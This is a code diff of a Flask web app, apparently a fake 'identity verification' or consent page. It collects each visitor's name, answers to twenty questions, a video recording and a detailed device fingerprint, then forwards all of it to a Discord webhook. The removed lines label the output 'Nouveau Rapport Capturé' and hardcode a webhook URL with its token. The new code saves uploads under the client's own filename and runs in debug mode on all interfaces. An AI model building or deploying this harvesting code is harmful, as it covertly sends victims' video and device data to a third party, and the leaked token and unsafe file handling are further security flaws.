@@ -1,97 +1,74 @@
-import os
-import json
-import requests
 from flask import Flask, render_template, request, jsonify
+import os
+import requests
+import json
 
 app = Flask(__name__)
 
-DISCORD_WEBHOOK_URL = os.getenv(
-    "DISCORD_WEBHOOK_URL",
-    "https://discord.com/api/webhooks/1566467697921753138/OFyLYOzINR7s8BdcheUpf27-BJb7i9OwwplEMIRHoK152MY0kBdMqGXJTHvUpEyih5lz"
-)
+UPLOAD_FOLDER = 'uploads'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-@app.route("/")
+# سحب رابط الـ Webhook من البيئة في Render أو وضعه مباشرة هنا
+DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "YOUR_DISCORD_WEBHOOK_URL_HERE")
+
+@app.route('/')
 def home():
-    return render_template("index.html")
+    return render_template('index.html')
 
-@app.route("/submit-consent", methods=["POST"])
+@app.route('/submit-consent', methods=['POST'])
 def submit_consent():
-    username = request.form.get("username", "Utilisateur Anonyme")
-    
-    device_str = request.form.get("device", "{}")
     try:
-        device = json.loads(device_str)
-    except Exception:
-        device = {}
+        username = request.form.get('username', 'Utilisateur Anonyme')
+        device_json = request.form.get('device', '{}')
+        
+        # جمع أجوبة الأسئلة الـ 20
+        answers_summary = ""
+        for i in range(1, 21):
+            ans = request.form.get(f'q{i}')
+            if ans:
+                answers_summary += f"Q{i}: {ans} | "
 
-    questions_summary = []
-    for i in range(1, 21):
-        val = request.form.get(f"q{i}", "N/A")
-        questions_summary.append(f"Q{i}: {val}")
-    
-    q_text = " | ".join(questions_summary[:5])
-
-    video_file = request.files.get("video")
-
-    appareil = device.get('appareil', 'Appareil Inconnu')
-    systeme = device.get('systemeExploitation', 'Système Inconnu')
-    navigateur = device.get('navigateur', 'Inconnu')
-    langue = device.get('langueSysteme', 'Inconnue')
-    ram = device.get('memoireRAMApproximative', 'Non disponible')
-    cpu = device.get('processeurCœurs', 'Non disponible')
-    resolution = device.get('resolutionEcran', 'Non disponible')
-    batterie = device.get('niveauBatterie', 'Non disponible')
-    charge = device.get('etatCharge', 'Non disponible')
-    eco = device.get('modeEconomieEnergie', 'Non disponible')
-    orientation = device.get('orientationEcran', 'Non disponible')
-    tactile = device.get('pointsTactilesMax', 'Non disponible')
-    architecture = device.get('architectureCPU', 'Non disponible')
-    reseau = device.get('connexionReseau', 'Non disponible')
-    time_zone = device.get('fuseauHoraire', 'Non disponible')
-
-    content_text = f"""✅ **Nouveau Rapport Capturé (Serveur de Youssef):**
-• **Nom / Statut:** {username}
-• **Questions:** {q_text}
-• **Appareil:** {appareil}
-• **Système d'exploitation:** {systeme}
-• **Navigateur:** {navigateur}
-• **Langue du système:** {langue}
-• **Niveau de Batterie:** {batterie} ({charge})
-• **Économie d'énergie:** {eco}
-• **Mémoire RAM:** {ram}
-• **Processeur (CPU):** {cpu} ({architecture})
-• **Résolution Écran:** {resolution} ({orientation})
-• **Points Tactiles:** {tactile}
-• **Réseau:** {reseau}
-• **Fuseau Horaire:** {time_zone}"""
-
-    payload = {
-        "content": content_text
-    }
-
-    try:
-        files = {}
+        # تحميل الفيديو المؤقت
+        video_file = request.files.get('video')
+        file_path = None
+        
         if video_file:
-            filename = video_file.filename or "recording.mp4"
-            file_bytes = video_file.read()
-            
-            content_type = "video/mp4" if filename.endswith(".mp4") else "video/webm"
-            
-            files = {
-                "file": (filename, file_bytes, content_type)
-            }
+            file_path = os.path.join(UPLOAD_FOLDER, video_file.filename)
+            video_file.save(file_path)
 
-        resp = requests.post(
-            DISCORD_WEBHOOK_URL, 
-            data={"payload_json": json.dumps(payload)}, 
-            files=files if files else None, 
-            timeout=30
+        # تجهيز الرسالة المرسلة لـ Discord
+        device_data = json.loads(device_json)
+        device_str = "\n".join([f"• **{k}**: {v}" for k, v in device_data.items()])
+        
+        message_content = (
+            f"🚨 **Rapport de Vérification d'Identité** 🚨\n"
+            f"👤 **Nom:** {username}\n\n"
+            f"📋 **Réponses aux questions:**\n{answers_summary}\n\n"
+            f"💻 **Informations de l'appareil & Batterie:**\n{device_str}"
         )
-        resp.raise_for_status()
 
-        return jsonify({"message": "Success"}), 200
-    except requests.RequestException as e:
-        return jsonify({"error": str(e)}), 500
+        # إرسال البيانات إلى ديسكورد
+        if file_path and os.path.exists(file_path):
+            with open(file_path, 'rb') as f:
+                response = requests.post(
+                    DISCORD_WEBHOOK_URL,
+                    data={"content": message_content},
+                    files={"file": f}
+                )
+            os.remove(file_path) # تنظيف الملف المحلي
+        else:
+            response = requests.post(
+                DISCORD_WEBHOOK_URL,
+                json={"content": message_content}
+            )
 
-if __name__ == "__main__":
-    app.run(port=5000, debug=True)
+        if response.status_code in [200, 204]:
+            return jsonify({"status": "success", "message": "Envoyé avec succès sur Discord"})
+        else:
+            return jsonify({"status": "error", "message": "Erreur Discord"}), 500
+
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+if __name__ == '__main__':
+    app.run(debug=True, host='0.0.0.0', port=5000)
